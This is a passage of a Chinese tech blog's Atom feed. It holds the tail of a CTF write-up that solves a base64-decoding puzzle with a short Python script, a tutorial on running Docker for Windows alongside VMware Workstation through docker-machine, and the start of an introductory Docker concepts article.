class="number">1</span>])</span><br><span class="line">    res = []</span><br><span class="line">    dfs(res, arr, <span class="number">0</span>)</span><br><span class="line">    res_decode = map(base64.b64decode, res)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> res_decode:</span><br><span class="line">        <span class="keyword">if</span> re.findall(<span class="string">r'\\x'</span>, repr(i)):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> i</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">base64wtfwtf123</span><br><span class="line">base64wtfwtL123</span><br><span class="line">base64wtLwtf123</span><br><span class="line">base64wtLwtL123</span><br><span class="line">baYe64wtfwtf123</span><br><span class="line">baYe64wtfwtL123</span><br><span class="line">baYe64wtLwtf123</span><br><span class="line">baYe64wtLwtL123</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p>得到base64wtfwtf123的md5值为16478a151bdd41335dcd69b270f6b985<br>flag就是这个了！</p><hr><p>分享一个自存CTF题的地址,如果需要请及时自取,地址挂了发个邮件给我:)</p><p>-=&gt; <a href="https://jxjjxy-my.sharepoint.com/:f:/g/personal/v0cjich_p_t_odmail_cn/EtMZ3q8LTIFAkS4Dcp8XAn8BDXTHqlJuV8S6bRu2mZgJHA?e=cT9hk2" target="_blank" rel="noopener">OneDrive cloud</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;大三接棒冲刺,这一战无疑需要取得好的成绩，为后辈树立榜样！不过福建省”黑盾杯”大多都是基础入门题,就算赢了,也不能太得意XD 路还长~任重而
      
    
    </summary>
    
      <category term="Writeup" scheme="http://qymua.com/categories/Writeup/"/>
    
    
      <category term="web,Re,crypto" scheme="http://qymua.com/tags/web-Re-crypto/"/>
    
  </entry>
  
  <entry>
    <title>浅谈Docker-for-Windows与VMware共存</title>
    <link href="http://qymua.com/2019/08/22/%E6%B5%85%E8%B0%88Docker-for-Windows%E4%B8%8EVMware%E5%85%B1%E5%AD%98/"/>
    <id>http://qymua.com/2019/08/22/浅谈Docker-for-Windows与VMware共存/</id>
    <published>2019-08-22T05:58:52.000Z</published>
    <updated>2019-08-23T09:37:42.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h1><hr><p>最近使用<code>docker</code>比较多，但是偶然间使用VM的时候遇到了兼容性冲突问题</p><p>使用过<code>VMware WorkStation</code>的朋友应该知道，<code>vm</code>无法与<code>hyper-v</code>共存。那么如果我的电脑已经安装和使用VM，如何才能使用<code>Docker for Windows</code>呢，如果要同时使用就只能放弃hyper-v啦</p><p><code>Docker for Windows</code> 不同于 <code>Docker Toolbox</code>。Docker for Windows 对系统的要求至少为<code>Windows 10</code>专业版，因为它需要<code>Hyper-V</code>的支持，而Dockbox Toolbox使用<code>Oracle Virtual Box</code>而不是Hyper-V . </p><p>但是我不希望<code>docker-machine</code>使用<code>Virtual Box</code>，相关配置我是参考<code>Toolbox</code>，道理是一样的XD</p><h1 id="安装Docker-for-Windows"><a href="#安装Docker-for-Windows" class="headerlink" title="安装Docker for Windows"></a>安装Docker for Windows</h1><h2 id="下载Docker-for-Windows"><a href="#下载Docker-for-Windows" class="headerlink" title="下载Docker for Windows"></a>下载Docker for Windows</h2><p>从这个地址下载并进行安装：<a href="https://download.docker.com/win/stable/Docker%20for%20Windows%20Installer.exe" target="_blank" rel="noopener">docker for windows</a></p><p>安装过程中如果遇到系统版本不适配的问题可以修改<code>EditionID</code>的变量值为<code>Profession</code> ，注册表地址如下：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE<span class="tag">\<span class="name">SOFTWARE</span></span><span class="tag">\<span class="name">Microsoft</span></span><span class="tag">\<span class="name">Windows</span></span> NT<span class="tag">\<span class="name">CurrentVersion</span></span></span><br></pre></td></tr></table></figure><blockquote><p>安装成功后不要启动服务</p></blockquote><h2 id="关闭Hyper-v"><a href="#关闭Hyper-v" class="headerlink" title="关闭Hyper-v"></a>关闭Hyper-v</h2><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /<span class="keyword">set</span> hypervisorlaunchtype <span class="comment">off</span></span><br></pre></td></tr></table></figure><p>管理员身份运行成功后重启计算机</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p><strong>1、下载最新版本boot2docker.iso</strong></p><p>下载地址 <a href="https://github.com/boot2docker/boot2docker/releases" target="_blank" rel="noopener">https://github.com/boot2docker/boot2docker/releases</a></p><p>然后将 boot2docker.iso 放在 <code>C:\Users\&lt;用户名&gt;\.docker\machine\cache\</code>，文件夹不存在就自己建立</p><p><strong>2、下载 VMware Workstation 驱动</strong></p><p>从这里下载 <a href="https://github.com/pecigonzalo/docker-machine-vmwareworkstation/releases/" target="_blank" rel="noopener">https://github.com/pecigonzalo/docker-machine-vmwareworkstation/releases/</a> </p><p>最新版的vm驱动。此驱动非官方开发，但是也在官方的文档中有链接</p><p>然后将 <code>docker-machine-driver-vmwareworkstation.exe</code>复制到 <code>C:\Program Files\Docker\Docker\resources\bin</code> 下：</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566451983155.png" alt></p><h2 id="安装Docker-Machine"><a href="#安装Docker-Machine" class="headerlink" title="安装Docker Machine"></a>安装Docker Machine</h2><p>Docker Machine 是 Docker 官方提供的一个工具，它可以帮助我们在远程的机器上安装 Docker，或者在虚拟机 host 上直接安装虚拟机并在虚拟机中安装 Docker。我们还可以通过 docker-machine 命令来管理这些虚拟机和 Docker。下面是来自 Docker Machine 官方文档的一张图，很形象哦！</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566532111553.png" alt></p><p>Docker Machine 的安装十分简单，如果在远程主机中直接把可执行文件下载到本地就可以了。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -L <span class="symbol">https:</span>/<span class="regexp">/github.com/docker</span><span class="regexp">/machine/releases</span><span class="regexp">/download/v</span><span class="number">0</span>.<span class="number">12.0</span>/docker-machine-<span class="string">`uname -s`</span>-<span class="string">`uname -m`</span> &gt; <span class="regexp">/tmp/docker</span>-machine</span><br><span class="line">$ chmod +x /tmp/docker-machine</span><br><span class="line">$ sudo mv /tmp/docker-machine /usr/local/bin/docker-machine</span><br></pre></td></tr></table></figure><p>其中 v0.12.0 是最新的版本。当然 Docker Machine 是个开源项目，你可以选择安装不同的版本，或者是自行编译。因为我不太需要在远程搭建docker，所以就不过多介绍了XD，下面还是继续正题</p><p><strong>0.重置docker-machine默认位置</strong></p><p>添加<code>MACHINE_STORAGE_PATH</code>环境变量，地址设为你希望存储的位置，重启系统</p><blockquote><p>如果你不想占用太多系统盘空间，建议改一下，另外有可能遇到ssh证书校验问题，不能确定真正的原因，如果这个方案你也失效了，那么请改回默认的地址<code>.docker/machine</code>目录下</p><p>并且建议你在实例安装成功后，更改虚拟机的工作文件，一样可以解决占用系统空间的问题😎</p></blockquote><p><strong>1、打开VMware Workstation</strong></p><p>这一步是必须的！VM版本必须大于10</p><p><strong>2、安装Docker-dev</strong></p><p>打开cmd，执行命令</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-machine <span class="built_in">create</span> <span class="comment">--driver=vmwareworkstation Docker-dev </span></span><br><span class="line">//docker-dev实际上是虚拟机的名称，可自定义</span><br></pre></td></tr></table></figure><p>执行过程如下</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566543018940.png" alt></p><p><strong>3、验证安装</strong></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-machine <span class="keyword">ls</span></span><br></pre></td></tr></table></figure><p>会出现看到刚刚安装的<code>docker-dev</code>实例</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566452235705.png" alt></p><p>如果列表有之前安装失败或者旧的dev，可以使用命令清除</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-machine rm -f  <span class="tag">&lt;<span class="name">NAME</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>4、激活实例</strong></p><p>执行命令：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker-machine env Docker-dev</span></span><br></pre></td></tr></table></figure><p>会出现要你配置的环境变量：</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566452381741.png" alt></p><p>依次添加环境变量即可</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566452429851.png" alt></p><p><strong>5、验证是否安装成功</strong></p><p><strong>登录dev实例</strong></p><p>使用命令登录：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker-machine ssh Docker-dev</span></span><br></pre></td></tr></table></figure><p>出现如下表示成功：</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566452613983.png" alt></p><h2 id="收尾工作"><a href="#收尾工作" class="headerlink" title="收尾工作"></a>收尾工作</h2><p><strong>1、配置加速器</strong></p><p>通过命令登录docker-machine</p><p>按照加速服务提供商的教程执行命令即可</p><p>本质上就是 </p><p>新建文件 <code>vi /etc/docker/daemon.json</code></p><p>输入以下内容</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"registry-mirrors"</span>: [<span class="string">"你的加速器地址"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>保存重启虚拟机即可</p><p>为了方便管理，你还可以在VMware 中添加你刚刚创建的<code>Docker-dev</code></p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566453255780.png" alt></p><p><strong>2.ssh连接方式</strong></p><p>通常情况下，推荐使用 <code>docker-machine ssh default</code> 进行登录，不需要输入密码。<code>default</code> 是默认的 <code>machine</code> 名字。</p><p>在 <code>boot2docker</code> 中，默认的用户名和密码是：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">user:</span> docker</span><br><span class="line"><span class="symbol">pass:</span> tcuser</span><br></pre></td></tr></table></figure><p>登录方法：</p><figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ ssh docker<span class="meta">@localhost</span> -p <span class="number">2022</span></span><br><span class="line">docker<span class="meta">@localhost</span>'s password: tcuser</span><br><span class="line">                        <span class="comment">##        .</span></span><br><span class="line">                  <span class="comment">## ## ##       ==</span></span><br><span class="line">               <span class="comment">## ## ## ##      ===</span></span><br><span class="line">           /<span class="string">""""""</span><span class="string">""""""</span><span class="string">""""\___/ ===</span></span><br><span class="line"><span class="string">      ~~~ &#123;~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~</span></span><br><span class="line"><span class="string">           \______ o          __/</span></span><br><span class="line"><span class="string">             \    \        __/</span></span><br><span class="line"><span class="string">              \____\______/</span></span><br></pre></td></tr></table></figure><p>这样我就能很方便的管理docker</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566532408512.png" alt></p><p><strong>3、关闭Docker Desktop 服务</strong></p><p>由于没有使用<code>hyper-v</code> 所以本地没必要起这个服务，可以把开机自启项去掉</p><p>每次使用的时候开启虚拟机Docker-dev即可</p><p>用法都一样，在vscode中依然正常连接，只是在终端使用的时候要ssh连接Docker-dev而已</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566454036757.png" alt></p><blockquote><p>果然还是入手mac是最高效的XD 花钱省心 ！</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前记&quot;&gt;&lt;a href=&quot;#前记&quot; class=&quot;headerlink&quot; title=&quot;前记&quot;&gt;&lt;/a&gt;前记&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;最近使用&lt;code&gt;docker&lt;/code&gt;比较多，但是偶然间使用VM的时候遇到了兼容性冲突问题&lt;/p&gt;
&lt;p&gt;使用过&lt;code
      
    
    </summary>
    
      <category term="Docker" scheme="http://qymua.com/categories/Docker/"/>
    
    
      <category term="docker" scheme="http://qymua.com/tags/docker/"/>
    
      <category term="Hyper-v" scheme="http://qymua.com/tags/Hyper-v/"/>
    
      <category term="VMware" scheme="http://qymua.com/tags/VMware/"/>
    
  </entry>
  
  <entry>
    <title>Docker入门之吐血总结</title>
    <link href="http://qymua.com/2019/08/22/Docker%E5%85%A5%E9%97%A8%E4%B9%8B%E5%90%90%E8%A1%80%E6%80%BB%E7%BB%93/"/>
    <id>http://qymua.com/2019/08/22/Docker入门之吐血总结/</id>
    <published>2019-08-21T16:54:56.000Z</published>
    <updated>2019-08-25T06:47:26.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>进入这个圈子挺久了，还没碰过docker，趁着暑假闲得慌，打一波基础XD </p><p>😄docker是个好东西，在CTF比赛中我们可以经常遇到通过docker部署的web，或者Pwn环境，同样我们也可以将一些服务部署在docker里面，管理方便，并且较为安全。</p><p>贴几个学习网址：<a href="https://registry.hub.docker.com/search?q=library" target="_blank" rel="noopener">Docker Hub</a> 、<a href="http://www.docker.org.cn/index.html" target="_blank" rel="noopener">docker中文社区</a>、<a href="https://docs.docker.com" target="_blank" rel="noopener">docker dcos</a>、<a href="https://yeasy.gitbooks.io/docker_practice/" target="_blank" rel="noopener">docker从入门到实践(超全)</a></p><p>接下来分三个部分入门docker：docker概念、docker使用、docker-CTF运用</p><h1 id="Docker概念"><a href="#Docker概念" class="headerlink" title="Docker概念"></a>Docker概念</h1><hr><blockquote><p><strong>Docker 是世界领先的软件容器平台</strong>，所以想要搞懂Docker的概念我们必须先从容器开始说起。</p></blockquote><h2 id="先从认识容器开始"><a href="#先从认识容器开始" class="headerlink" title="先从认识容器开始"></a>先从认识容器开始</h2><h3 id="什么是容器"><a href="#什么是容器" class="headerlink" title="什么是容器?"></a>什么是容器?</h3><h4 id="先来看看容器较为官方的解释"><a href="#先来看看容器较为官方的解释" class="headerlink" title="先来看看容器较为官方的解释"></a>先来看看容器较为官方的解释</h4><p><strong>一句话概括容器：容器就是将软件打包成标准化单元，以用于开发、交付和部署。</strong> </p><ul><li><strong>容器镜像是轻量的、可执行的独立软件包</strong> ，包含软件运行所需的所有内容：代码、运行时环境、系统工具、系统库和设置。</li><li><strong>容器化软件适用于基于Linux和Windows的应用，在任何环境中都能够始终如一地运行。</strong></li><li><strong>容器赋予了软件独立性</strong>　，使其免受外在环境差异（例如，开发和预演环境的差异）的影响，从而有助于减少团队间在相同基础设施上运行不同软件时的冲突。</li></ul><h4 id="再来看看容器较为通俗的解释"><a href="#再来看看容器较为通俗的解释" class="headerlink" title="再来看看容器较为通俗的解释"></a>再来看看容器较为通俗的解释</h4><p><strong>如果需要通俗的描述容器的话，我觉得容器就是一个存放东西的地方，就像书包可以装各种文具、衣柜可以放各种衣服、鞋架可以放各种鞋子一样。我们现在所说的容器存放的东西可能更偏向于应用比如网站、程序甚至是系统环境。</strong></p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566217324907.png" alt="认识容器"></p><h3 id="图解物理机-虚拟机与容器"><a href="#图解物理机-虚拟机与容器" class="headerlink" title="图解物理机,虚拟机与容器"></a>图解物理机,虚拟机与容器</h3><p>关于虚拟机与容器的对比在后面会详细介绍到，这里只是通过网上的图片加深大家对于物理机、虚拟机与容器这三者的理解。</p><p><strong>物理机</strong><br><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566217324917.jpg" alt="物理机"></p><p><strong>虚拟机：</strong></p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566217324522.jpg" alt="虚拟机"></p><p><strong>容器：</strong></p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566217324925.jpg" alt="容器"></p><p>通过上面这三张抽象图，我们可以大概可以通过类比概括出： <strong>容器虚拟化的是操作系统而不是硬件，容器之间是共享同一套操作系统资源的。虚拟机技术是虚拟出一套硬件后，在其上运行一个完整操作系统。因此容器的隔离级别会稍低一些。</strong></p><hr><blockquote><p>相信通过上面的解释大家对于容器这个既陌生又熟悉的概念有了一个初步的认识，下面我们就来谈谈Docker的一些概念。</p></blockquote><h2 id="再来谈谈-Docker-的一些概念"><a href="#再来谈谈-Docker-的一些概念" class="headerlink" title="再来谈谈 Docker 的一些概念"></a>再来谈谈 Docker 的一些概念</h2><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566217324714.png" alt="Docker的一些概念"></p><h3 id="什么是-Docker"><a href="#什么是-Docker" class="headerlink" title="什么是 Docker?"></a>什么是 Docker?</h3><p>说实话关于Docker是什么并太好说，下面我通过四点向你说明Docker到底是个什么东西。</p><ul><li><strong>Docker 是世界领先的软件容器平台。</strong> </li><li><strong>Docker</strong> 使用 Google 公司推出的 <strong>Go 语言</strong>  进行开发实现，基于 <strong>Linux 内核</strong> 的cgroup，namespace，以及AUFS类的<strong>UnionFS</strong>等技术，<strong>对进程进行封装隔离，属于操作系统层面的虚拟化技术。</strong> 由于隔离的进程独立于宿主和其它的隔离的进<br>程，因此也称其为容器。<strong>Docke最初实现是基于 LXC.</strong></li><li><strong>Docker 能够自动执行重复性任务，例如搭建和配置开发环境，从而解放了开发人员以便他们专注在真正重要的事情上：构建杰出的软件。</strong></li><li><strong>用户可以方便地创建和使用容器，把自己的应用放入容器。容器还可以进行版本管理、复制、分享、修改，就像管理普通的代码一样。</strong></li></ul><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566217324438.jpg" alt="什么是Docker"></p><h3 id="Docker-思想"><a href="#Docker-思想" class="headerlink" title="Docker 思想"></a>Docker 思想</h3><ul><li><strong>集装箱</strong></li><li><strong>标准化：</strong> ①运输方式    ② 存储方式 ③ API接口</li><li><strong>隔离</strong></li></ul><h3 id="Docker-容器的特点"><a href="#Docker-容器的特点" class="headerlink" title="Docker 容器的特点"></a>Docker 容器的特点</h3><ul><li><h4 id="轻量"><a href="#轻量" class="headerlink" title="轻量"></a>轻量</h4><p>在一台机器上运行的多个 Docker 容器可以共享这台机器的操作系统内核；它们能够迅速启动，只需占用很少的计算和内存资源。镜像是通过文件系统层进行构造的，并共享一些公共文件。这样就能尽量降低磁盘用量，并能更快地下载镜像。</p></li><li><h4 id="标准"><a href="#标准" class="headerlink" title="标准"></a>标准</h4><p>Docker 容器基于开放式标准，能够在所有主流 Linux 版本、Microsoft Windows 以及包括 VM、裸机服务器和云在内的任何基础设施上运行。</p></li><li><h4 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h4><p>Docker 赋予应用的隔离性不仅限于彼此隔离，还独立于底层的基础设施。Docker 默认提供最强的隔离，因此应用出现问题，也只是单个容器的问题，而不会波及到整台机器。</p></li></ul><h3 id="为什么要用-Docker"><a href="#为什么要用-Docker" class="headerlink" title="为什么要用 Docker ?"></a>为什么要用 Docker ?</h3><ul><li><strong>Docker 的镜像提供了除内核外完整的运行时环境，确保了应用运行环境一致性，从而不会再出现 “这段代码在我机器上没问题啊” 这类问题；——一致的运行环境</strong></li><li><strong>可以做到秒级、甚至毫秒级的启动时间。大大的节约了开发、测试、部署的时间。——更快速的启动时间</strong></li><li><strong>避免公用的服务器，资源会容易受到其他用户的影响。——隔离性</strong></li><li><strong>善于处理集中爆发的服务器使用压力；——弹性伸缩，快速扩展</strong></li><li><strong>可以很轻易的将在一个平台上运行的应用，迁移到另一个平台上，而不用担心运行环境的变化导致应用无法正常运行的情况。——迁移方便</strong></li><li><strong>使用 Docker 可以通过定制应用镜像来实现持续集成、持续交付、部署。——持续交付和部署</strong></li></ul><hr><blockquote><p>每当说起容器，我们不得不将其与虚拟机做一个比较。就我而言，对于两者无所谓谁会取代谁，而是两者可以和谐共存。</p></blockquote><h2 id="容器-VS-虚拟机"><a href="#容器-VS-虚拟机" class="headerlink" title="容器 VS 虚拟机"></a>容器 VS 虚拟机</h2><p>　　简单来说： <strong>容器和虚拟机具有相似的资源隔离和分配优势，但功能有所不同，因为容器虚拟化的是操作系统，而不是硬件，因此容器更容易移植，效率也更高。</strong></p><h3 id="两者对比图"><a href="#两者对比图" class="headerlink" title="两者对比图"></a>两者对比图</h3><p>　　传统虚拟机技术是虚拟出一套硬件后，在其上运行一个完整操作系统，在该系统上再运行所需应用进程；而容器内的应用进程直接运行于宿主的内核，容器内没有自己的内核，而且也没有进行硬件虚拟。因此容器要比传统虚拟机更为轻便.</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566217325054.jpg" alt="容器 VS 虚拟机"></p><h3 id="容器与虚拟机总结"><a href="#容器与虚拟机总结" class="headerlink" title="容器与虚拟机总结"></a>容器与虚拟机总结</h3><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566217324888.jpg" alt="容器与虚拟机 (VM) 总结"></p><ul><li><p><strong>容器是一个应用层抽象，用于将代码和依赖资源打包在一起。</strong> <strong>多个容器可以在同一台机器上运行，共享操作系统内核，但各自作为独立的进程在用户空间中运行</strong> 。与虚拟机相比， <strong>容器占用的空间较少</strong>（容器镜像大小通常只有几十兆），<strong>瞬间就能完成启动</strong> 。</p></li><li><p><strong>虚拟机 (VM) 是一个物理硬件层抽象，用于将一台服务器变成多台服务器。</strong> 管理程序允许多个 VM 在一台机器上运行。每个VM都包含一整套操作系统、一个或多个应用、必要的二进制文件和库资源，因此 <strong>占用大量空间</strong> 。而且 VM  <strong>启动也十分缓慢</strong> 。</p></li></ul><p>　　通过Docker官网，我们知道了这么多Docker的优势，但是大家也没有必要完全否定虚拟机技术，因为两者有不同的使用场景。<strong>虚拟机更擅长于彻底隔离整个运行环境</strong>。例如，云服务提供商通常采用虚拟机技术隔离不同的用户。而 <strong>Docker通常用于隔离不同的应用</strong> ，例如前端，后端以及数据库。</p><p>  <img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566324057467.png" alt></p><p>如上图所示，Docker 守护进程运行在一台主机上。用户并不直接和守护进程进行交互，而是通过 Docker 客户端间接和其通信。<br>Docker 客户端，实际上是 docker 的二进制程序，是主要的用户与 Docker 交互方式。它接收用户指令并且与背后的 Docker 守护进程通信，如此来回往复。</p><h3 id="容器与虚拟机两者是可以共存的"><a href="#容器与虚拟机两者是可以共存的" class="headerlink" title="容器与虚拟机两者是可以共存的"></a>容器与虚拟机两者是可以共存的</h3><p>就我而言，对于两者无所谓谁会取代谁，而是两者可以和谐共存。</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566217324243.jpg" alt="两者是可以共存的"></p><hr><blockquote><p> Docker中非常重要的三个基本概念，理解了这三个概念，就理解了 Docker 的整个生命周期。</p></blockquote><h2 id="Docker基本概念"><a href="#Docker基本概念" class="headerlink" title="Docker基本概念"></a>Docker基本概念</h2><p>Docker 包括三个基本概念</p><ul><li><strong>镜像（Image）</strong></li><li><strong>容器（Container）</strong></li><li><strong>仓库（Repository）</strong></li></ul><p>理解了这三个概念，就理解了 Docker 的整个生命周期</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566217325229.jpg" alt="Docker 包括三个基本概念"></p><h3 id="镜像-Image-一个特殊的文件系统"><a href="#镜像-Image-一个特殊的文件系统" class="headerlink" title="镜像(Image):一个特殊的文件系统"></a>镜像(Image):一个特殊的文件系统</h3><p>　　<strong>操作系统分为内核和用户空间</strong>。对于 Linux 而言，内核启动后，会挂载 root 文件系统为其提供用户空间支持。而Docker 镜像（Image），就相当于是一个 root 文件系统。</p><p>　　<strong>Docker 镜像是一个特殊的文件系统，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。</strong> 镜像不包含任何动态数据，其内容在构建之后也不会被改变。</p><p>　　镜像（<code>Image</code>）就是一堆只读层（<code>read-only layer</code>）的统一视角，也许这个定义有些难以理解，下面的这张图能够帮助读者理解镜像的定义。</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566323353889.png" alt></p><p>　　从左边我们看到了多个只读层，它们重叠在一起。除了最下面一层，其它层都会有一个指针指向下一层。这些层是Docker 内部的实现细节，并且能够在主机的文件系统上访问到。统一文件系统 (union file system) 技术能够将不同的层整合成一个文件系统，为这些层提供了一个统一的视角，这样就隐藏了多层的存在，在用户的角度看来，只存在一个文件系统。我们可以在图片的右边看到这个视角的形式。</p><p>　　Docker 设计时，就充分利用 <strong>Union FS</strong>的技术，将其设计为 <strong>分层存储的架构</strong> 。 镜像实际是由多层文件系统联合组成。</p><p>　　<strong>镜像构建时，会一层层构建，前一层是后一层的基础。每一层构建完就不会再发生改变，后一层上的任何改变只发生在自己这一层。</strong>　比如，删除前一层文件的操作，实际不是真的删除前一层的文件，而是仅在当前层标记为该文件已删除。在最终容器运行的时候，虽然不会看到这个文件，但是实际上该文件会一直跟随镜像。因此，在构建镜像的时候，需要额外小心，每一层尽量只包含该层需要添加的东西，任何额外的东西应该在该层构建结束前清理掉。</p><p>　　分层存储的特征还使得镜像的复用、定制变的更为容易。甚至可以用之前构建好的镜像作为基础层，然后进一步添加新的层，以定制自己所需的内容，构建新的镜像。</p><h3 id="容器-Container-镜像运行时的实体"><a href="#容器-Container-镜像运行时的实体" class="headerlink" title="容器(Container):镜像运行时的实体"></a>容器(Container):镜像运行时的实体</h3><p>　　镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的 类 和 实例 一样，镜像是静态的定义，<strong>容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等</strong> 。</p><p>　　<strong>容器的实质是进程，但与直接在宿主执行的进程不同，容器进程运行于属于自己的独立的 命名空间。前面讲过镜像使用的是分层存储，容器也是如此。</strong></p><p>　　<strong>容器存储层的生存周期和容器一样，容器消亡时，容器存储层也随之消亡。因此，任何保存于容器存储层的信息都会随容器删除而丢失。</strong></p><p>　　按照 Docker 最佳实践的要求，<strong>容器不应该向其存储层内写入任何数据</strong> ，容器存储层要保持无状态化。<strong>所有的文件写入操作，都应该使用数据卷（Volume）、或者绑定宿主目录</strong>，在这些位置的读写会跳过容器存储层，直接对宿主(或网络存储)发生读写，其性能和稳定性更高。数据卷的生存周期独立于容器，容器消亡，数据卷不会消亡。因此， <strong>使用数据卷后，容器可以随意删除、重新 run ，数据却不会丢失。</strong></p><h3 id="仓库-Repository-集中存放镜像文件的地方"><a href="#仓库-Repository-集中存放镜像文件的地方" class="headerlink" title="仓库(Repository):集中存放镜像文件的地方"></a>仓库(Repository):集中存放镜像文件的地方</h3><p>　　镜像构建完成后，可以很容易的在当前宿主上运行，但是， <strong>如果需要在其它服务器上使用这个镜像，我们就需要一个集中的存储、分发镜像的服务，Docker Registry就是这样的服务。</strong></p><p>　　一个 Docker Registry中可以包含多个仓库（Repository）；每个仓库可以包含多个标签（Tag）；每个标签对应一个镜像。所以说：<strong>镜像仓库是Docker用来集中存放镜像文件的地方类似于我们之前常用的代码仓库。</strong></p><p>　　通常，<strong>一个仓库会包含同一个软件不同版本的镜像</strong>，而<strong>标签就常用于对应该软件的各个版本</strong> 。我们可以通过<code>&lt;仓库名&gt;:&lt;标签&gt;</code>的格式来指定具体是这个软件哪个版本的镜像。如果不给出标签，将以 latest 作为默认标签.。</p><p><strong>这里补充一下Docker Registry 公开服务和私有 Docker Registry的概念：</strong></p><p>　　<strong>Docker Registry 公开服务</strong> 是开放给用户使用、允许用户管理镜像的 Registry 服务。一般这类公开服务允许用户免费上传、下载公开的镜像，并可能提供收费服务供用户管理私有镜像。</p><p>　　最常使用的 Registry 公开服务是官方的 <strong>Docker Hub</strong> ，这也是默认的 Registry，并拥有大量的高质量的官方镜像，网址为：<a href="https://hub.docker.com/" target="_blank" rel="noopener">https://hub.docker.com/</a> 。在国内访问<strong>Docker Hub</strong> 可能会比较慢国内也有一些云服务商提供类似于 Docker Hub 的公开服务。比如 <a href="https://hub.tenxcloud.com/" target="_blank" rel="noopener">时速云镜像库</a>、<a href="https://www.163yun.com/product/repo" target="_blank" rel="noopener">网易云镜像服务</a>、<a href="https://www.daocloud.io/" target="_blank" rel="noopener">DaoCloud 镜像市场</a>、<a href="https://www.aliyun.com/product/containerservice?utm_content=se_1292836" target="_blank" rel="noopener">阿里云镜像库</a>等。<br><strong>例如：</strong><br>配置阿里云镜像加速器</p><p>针对Docker客户端版本大于 1.10.0 的用户</p><p>您可以通过修改daemon配置文件/etc/docker/daemon.json来使用加速器</p><p>也就是执行下面的shell脚本即可</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 